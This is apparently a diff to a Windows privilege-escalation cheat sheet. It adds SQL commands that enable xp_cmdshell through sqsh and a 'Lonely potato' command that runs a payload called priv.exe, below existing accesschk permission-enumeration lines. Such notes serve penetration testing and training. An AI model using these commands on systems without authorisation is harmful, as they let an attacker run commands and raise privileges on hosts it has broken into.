@@ -154,8 +154,21 @@ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
 accesschk.exe -qdws Users C:\Windows\
 ```
+##### Enable xp_cmdshell with sqsh
+```
+EXEC SP_CONFIGURE 'show advanced options', 1
+reconfigure
+go
 
 
+EXEC SP_CONFIGURE 'xp_cmdshell', 1
+reconfigure
+go
+```
+##### Lonely potato
+```
+lonely.exe * y:\priv.exe
+```
 
 
 
